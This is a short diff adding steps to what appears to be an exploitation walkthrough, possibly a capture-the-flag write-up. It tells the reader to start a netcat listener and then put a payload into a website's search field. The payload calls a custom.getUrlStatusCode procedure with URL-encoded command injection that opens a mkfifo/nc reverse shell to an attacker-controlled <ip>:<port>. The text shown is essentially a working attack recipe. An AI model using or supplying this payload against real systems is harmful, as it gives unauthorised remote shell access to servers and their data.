@@ -51,5 +51,11 @@ nc -lnvp 4444
 
 2. Enter the payload into search query on the website.
 
+```bash
+CALL custom.getUrlStatusCode("http://<ip>:<port>/?c=$(rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<ip>%20<port>%20%3E%2Ftmp%2Ff)")
+```
 
+3. Check your listener for response.
+
+   
 
